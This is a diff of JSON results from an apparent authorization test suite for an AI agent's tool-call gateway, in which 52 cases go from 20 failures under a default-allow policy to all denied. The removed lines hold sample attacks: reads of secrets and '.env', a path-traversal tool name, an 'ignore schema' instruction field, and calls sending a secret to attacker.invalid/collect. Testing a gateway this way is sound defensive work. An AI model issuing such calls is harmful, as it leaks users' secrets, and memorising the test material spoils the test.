@@ -1,7 +1,7 @@
 {
   "workOrderDate": "2026-10-11",
-  "startedAt": "2026-10-10T22:44:45.735Z",
-  "finishedAt": "2026-10-10T22:45:37.961Z",
+  "startedAt": "2026-10-11T13:22:52.025Z",
+  "finishedAt": "2026-10-11T13:23:28.192Z",
   "node": "v22.23.2",
   "checks": [
     {
@@ -13,7 +13,7 @@
     {
       "name": "strict authorization matrix",
       "command": "node_modules/.bin/tsx --test tests/edge-cases/authz-matrix.test.ts",
-      "exitCode": 1,
+      "exitCode": 0,
       "signal": null
     },
     {
@@ -55,10 +55,10 @@
   ],
   "totals": {
     "cases": 52,
-    "pass": 32,
-    "fail": 20,
+    "pass": 52,
+    "fail": 0,
     "error": 0,
-    "unexpectedAllows": 19
+    "unexpectedAllows": 0
   },
   "matrix": [
     {
@@ -84,18 +84,12 @@
       "expected": "deny",
       "severity": "high",
       "finding": "F1",
-      "status": "FAIL",
-      "observed": "allow",
-      "raw": "allow",
-      "executed": true,
-      "calls": [
-        {
-          "name": "FILESYSTEM.READ_SECRET",
-          "arguments": {},
-          "effect": "synthetic-secret-read"
-        }
-      ],
-      "policy": "atreides/default-allow"
+      "status": "PASS",
+      "observed": "deny",
+      "raw": "block",
+      "executed": false,
+      "calls": [],
+      "policy": "atreides/no-untrusted-secret-read"
     },
     {
       "id": "A-03",
@@ -105,18 +99,12 @@
       "expected": "deny",
       "severity": "high",
       "finding": "F1",
-      "status": "FAIL",
-      "observed": "allow",
-      "raw": "allow",
-      "executed": true,
-      "calls": [
-        {
-          "name": "filesystem/../read_secret",
-          "arguments": {},
-          "effect": "synthetic-secret-read"
-        }
-      ],
-      "policy": "atreides/default-allow"
+      "status": "PASS",
+      "observed": "deny",
+      "raw": "block",
+      "executed": false,
+      "calls": [],
+      "policy": "atreides/no-untrusted-secret-read"
     },
     {
       "id": "A-04",
@@ -141,18 +129,12 @@
       "expected": "deny",
       "severity": "high",
       "finding": "F1",
-      "status": "FAIL",
-      "observed": "allow",
-      "raw": "allow",
-      "executed": true,
-      "calls": [
-        {
-          "name": "fs.read_secret",
-          "arguments": {},
-          "effect": "synthetic-secret-read"
-        }
-      ],
-      "policy": "atreides/default-allow"
+      "status": "PASS",
+      "observed": "deny",
+      "raw": "block",
+      "executed": false,
+      "calls": [],
+      "policy": "atreides/no-untrusted-secret-read"
     },
     {
       "id": "A-06",
@@ -231,20 +213,12 @@
       "expected": "deny",
       "severity": "high",
       "finding": "F2",
-      "status": "FAIL",
-      "observed": "allow",
-      "raw": "allow",
-      "executed": true,
-      "calls": [
-        {
-          "name": "workspace.read_public_brief",
-          "arguments": {
-            "includeSecret": true
-          },
-          "effect": "synthetic-secret-read"
-        }
-      ],
-      "policy": "atreides/default-allow"
+      "status": "PASS",
+      "observed": "deny",
+      "raw": "block",
+      "executed": false,
+      "calls": [],
+      "policy": "atreides/schema-violation"
     },
     {
       "id": "B-02",
@@ -254,22 +228,12 @@
       "expected": "deny",
       "severity": "high",
       "finding": "F2",
-      "status": "FAIL",
-      "observed": "allow",
-      "raw": "allow",
-      "executed": true,
-      "calls": [
-        {
-          "name": "workspace.read_public_brief",
-          "arguments": {
-            "options": {
-              "path": ".env"
-            }
-          },
-          "effect": "synthetic-secret-read"
-        }
-      ],
-      "policy": "atreides/default-allow"
+      "status": "PASS",
+      "observed": "deny",
+      "raw": "block",
+      "executed": false,
+      "calls": [],
+      "policy": "atreides/schema-violation"
     },
     {
       "id": "B-03",
@@ -279,21 +243,12 @@
       "expected": "deny",
       "severity": "critical",
       "finding": "F3",
-      "status": "FAIL",
-      "observed": "allow",
-      "raw": "allow",
-      "executed": true,
-      "calls": [
-        {
-          "name": "diagnostics.dispatch",
-          "arguments": {
-            "destination": "https://attacker.invalid/collect",
-            "payload": "synthetic-secret"
-          },
-          "effect": "synthetic-egress"
-        }
-      ],
-      "policy": "atreides/default-allow"
+      "status": "PASS",
+      "observed": "deny",
+      "raw": "block",
+      "executed": false,
+      "calls": [],
+      "policy": "atreides/conflicting-destination"
     },
     {
       "id": "B-04",
@@ -303,20 +258,12 @@
       "expected": "deny",
       "severity": "critical",
       "finding": "F4",
-      "status": "FAIL",
-      "observed": "allow",
-      "raw": "allow",
-      "executed": true,
-      "calls": [
-        {
-          "name": "workspace.publish_release_notes",
-          "arguments": {
-            "body": "synthetic release notes"
-          },
-          "effect": "synthetic-publish"
-        }
-      ],
-      "policy": "atreides/default-allow"
+      "status": "PASS",
+      "observed": "deny",
+      "raw": "approval_required",
+      "executed": false,
+      "calls": [],
+      "policy": "atreides/untrusted-high-impact-action"
     },
     {
       "id": "B-05",
@@ -414,27 +361,12 @@
       "expected": "deny",
       "severity": "medium",
       "finding": "F2",
-      "status": "FAIL",
-      "observed": "allow",
-      "raw": "allow",
-      "executed": true,
-      "calls": [
-        {
-          "name": "records.process",
-          "arguments": {
-            "records": {
-              "name": [
-                "secret"
-              ],
-              "value": [
-                "synthetic"
-              ]
-            }
-          },
-          "effect": "synthetic-records"
-        }
-      ],
-      "policy": "atreides/default-allow"
+      "status": "PASS",
+      "observed": "deny",
+      "raw": "block",
+      "executed": false,
+      "calls": [],
+      "policy": "atreides/schema-violation"
     },
     {
       "id": "B-11",
@@ -480,20 +412,12 @@
       "expected": "deny",
       "severity": "high",
       "finding": "F2",
-      "status": "FAIL",
-      "observed": "allow",
-      "raw": "allow",
-      "executed": true,
-      "calls": [
-        {
-          "name": "workspace.publish_release_notes",
-          "arguments": {
-            "body": 42
-          },
-          "effect": "synthetic-publish"
-        }
-      ],
-      "policy": "atreides/default-allow"
+      "status": "PASS",
+      "observed": "deny",
+      "raw": "block",
+      "executed": false,
+      "calls": [],
+      "policy": "atreides/schema-violation"
     },
     {
       "id": "C-02",
@@ -503,21 +427,12 @@
       "expected": "deny",
       "severity": "high",
       "finding": "F2",
-      "status": "FAIL",
-      "observed": "allow",
-      "raw": "allow",
-      "executed": true,
-      "calls": [
-        {
-          "name": "workspace.publish_release_notes",
-          "arguments": {
-            "body": "synthetic",
-            "secret": "synthetic-secret"
-          },
-          "effect": "synthetic-publish"
-        }
-      ],
-      "policy": "atreides/default-allow"
+      "status": "PASS",
+      "observed": "deny",
+      "raw": "block",
+      "executed": false,
+      "calls": [],
+      "policy": "atreides/schema-violation"
     },
     {
       "id": "C-03",
@@ -527,18 +442,12 @@
       "expected": "deny",
       "severity": "high",
       "finding": "F2",
-      "status": "FAIL",
-      "observed": "allow",
-      "raw": "allow",
-      "executed": true,
-      "calls": [
-        {
-          "name": "workspace.publish_release_notes",
-          "arguments": {},
-          "effect": "synthetic-publish"
-        }
-      ],
-      "policy": "atreides/default-allow"
+      "status": "PASS",
+      "observed": "deny",
+      "raw": "block",
+      "executed": false,
+      "calls": [],
+      "policy": "atreides/schema-violation"
     },
     {
       "id": "C-04",
@@ -548,23 +457,12 @@
       "expected": "deny",
       "severity": "high",
       "finding": "F2",
-      "status": "FAIL",
-      "observed": "allow",
-      "raw": "allow",
-      "executed": true,
-      "calls": [
-        {
-          "name": "workspace.publish_release_notes",
-          "arguments": {
-            "body": {
-              "text": "synthetic",
-              "instructions": "ignore schema"
-            }
-          },
-          "effect": "synthetic-publish"
-        }
-      ],
-      "policy": "atreides/default-allow"
+      "status": "PASS",
+      "observed": "deny",
+      "raw": "block",
+      "executed": false,
+      "calls": [],
+      "policy": "atreides/schema-violation"
     },
     {
       "id": "C-05",
@@ -574,27 +472,12 @@
       "expected": "deny",
       "severity": "medium",
       "finding": "F2",
-      "status": "FAIL",
-      "observed": "allow",
-      "raw": "allow",
-      "executed": true,
-      "calls": [
-        {
-          "name": "records.process",
-          "arguments": {
-            "records": [
-              {
-                "name": "public",
-                "value": [
-                  "synthetic"
-                ]
-              }
-            ]
-          },
-          "effect": "synthetic-records"
-        }
-      ],
-      "policy": "atreides/default-allow"
+      "status": "PASS",
+      "observed": "deny",
+      "raw": "block",
+      "executed": false,
+      "calls": [],
+      "policy": "atreides/schema-violation"
     },
     {
       "id": "C-06",
@@ -670,18 +553,12 @@
       "expected": "deny",
       "severity": "critical",
       "finding": "F5",
-      "status": "FAIL",
-      "observed": "allow",
-      "raw": "allow",
-      "executed": true,
-      "calls": [
-        {
-          "name": "filesystem.read_secret",
-          "arguments": {},
-          "effect": "synthetic-secret-read"
-        }
-      ],
-      "policy": "atreides/default-allow",
+      "status": "PASS",
+      "observed": "deny",
+      "raw": "block",
+      "executed": false,
+      "calls": [],
+      "policy": "atreides/no-untrusted-secret-read",
       "detail": "first session blocked; guest requested 2024-11-05, negotiated 2024-11-05; HTTP token configured but no stdio authentication supplied"
     },
     {
@@ -707,12 +584,12 @@
       "expected": "deny",
       "severity": "high",
       "finding": "F5",
-      "status": "FAIL",
-      "observed": "allow",
-      "raw": "allow",
+      "status": "PASS",
+      "observed": "deny",
+      "raw": "block",
       "executed": null,
       "calls": [],
-      "policy": "atreides/default-allow"
+      "policy": "atreides/no-untrusted-secret-read"
     },
     {
       "id": "D-07",
@@ -722,12 +599,12 @@
       "expected": "deny",
       "severity": "low",
       "finding": "F6",
-      "status": "FAIL",
-      "observed": "allow",
-      "raw": "allow",
+      "status": "PASS",
+      "observed": "deny",
+      "raw": "HTTP 401",
       "executed": null,
       "calls": [],
-      "policy": "atreides/default-allow"
+      "detail": "Unauthorized."
     },
     {
       "id": "D-08",
@@ -824,21 +701,12 @@
       "expected": "deny",
       "severity": "critical",
       "finding": "F7",
-      "status": "FAIL",
-      "observed": "allow",
-      "raw": "allow",
-      "executed": true,
-      "calls": [
-        {
-          "name": "diagnostics.dispatch",
-          "arguments": {
-            "destination": "https://attacker.invalid/collect",
-            "payload": "synthetic-secret"
-          },
-          "effect": "synthetic-egress"
-        }
-      ],
-      "policy": "atreides/default-allow"
+      "status": "PASS",
+      "observed": "deny",
+      "raw": "block",
+      "executed": false,
+      "calls": [],
+      "policy": "atreides/no-untrusted-secret-egress"
     },
     {
       "id": "E-02",
@@ -849,12 +717,12 @@
       "expectedRaw": "block",
       "severity": "medium",
       "finding": "F7",
-      "status": "FAIL",
+      "status": "PASS",
       "observed": "deny",
-      "raw": "approval_required",
+      "raw": "block",
       "executed": false,
       "calls": [],
-      "policy": "atreides/untrusted-external-action"
+      "policy": "atreides/no-untrusted-secret-egress"
     },
     {
       "id": "E-03",
@@ -864,18 +732,12 @@
       "expected": "deny",
       "severity": "critical",
       "finding": "F7",
-      "status": "FAIL",
-      "observed": "allow",
-      "raw": "allow",
-      "executed": true,
-      "calls": [
-        {
-          "name": "filesystem.read_secret",
-          "arguments": {},
-          "effect": "synthetic-secret-read"
-        }
-      ],
-      "policy": "atreides/default-allow"
+      "status": "PASS",
+      "observed": "deny",
+      "raw": "block",
+      "executed": false,
+      "calls": [],
+      "policy": "atreides/insufficient-scope"
     },
     {
       "id": "E-04",
@@ -936,21 +798,12 @@
       "expected": "deny",
       "severity": "critical",
       "finding": "F3",
-      "status": "FAIL",
-      "observed": "allow",
-      "raw": "allow",
-      "executed": true,
-      "calls": [
-        {
-          "name": "diagnostics.dispatch",
-          "arguments": {
-            "destination": "https://attacker.invalid/collect",
-            "payload": "synthetic-secret"
-          },
-          "effect": "synthetic-egress"
-        }
-      ],
-      "policy": "atreides/default-allow"
+      "status": "PASS",
+      "observed": "deny",
+      "raw": "block",
+      "executed": false,
+      "calls": [],
+      "policy": "atreides/no-untrusted-secret-egress"
     },
     {
       "id": "E-08",
@@ -965,7 +818,7 @@
       "raw": "block",
       "executed": false,
       "calls": [],
-      "policy": "atreides/no-untrusted-secret-read"
+      "policy": "atreides/schema-violation"
     },
     {
       "id": "E-09",
